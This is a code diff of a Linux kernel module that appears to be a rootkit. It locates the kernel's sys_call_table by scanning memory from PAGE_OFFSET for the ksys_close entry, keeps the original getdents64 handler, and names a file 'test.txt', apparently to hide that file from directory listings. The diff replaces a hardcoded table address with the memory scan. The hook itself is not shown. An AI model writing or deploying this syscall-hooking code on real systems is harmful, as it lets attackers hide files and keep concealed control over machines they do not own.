@@ -10,7 +10,6 @@
 
 #define FILE_NAME "test.txt"
 
-// uint64_t **sct;
 void **sct;
 
 asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
@@ -74,12 +73,12 @@ int set_page_rw(unsigned long addr, int f) {
 }
 
 void get_sct(void) {
-  uint64_t offset = PAGE_OFFSET;
+  uintptr_t offset = PAGE_OFFSET;
 
   while(offset < ULLONG_MAX) {
-    sct = (uint64_t**)offset;
+    sct = (uintptr_t**)offset;
 
-    if(sct[__NR_close] == (uint64_t*)ksys_close) {
+    if(sct[__NR_close] == (uintptr_t*)ksys_close) {
       printk("🍺 sys_call_table found at address: 0x%p\n", sct);
       return;
     }
@@ -89,8 +88,7 @@ void get_sct(void) {
 }
 
 int f_init(void) {
-  // get_sct();
-  sct = (void*)0xffffffff820013a0;
+  get_sct();
 
   if(sct == NULL) {
     printk("⚠️ Failed to get sys_call_table addr\n");
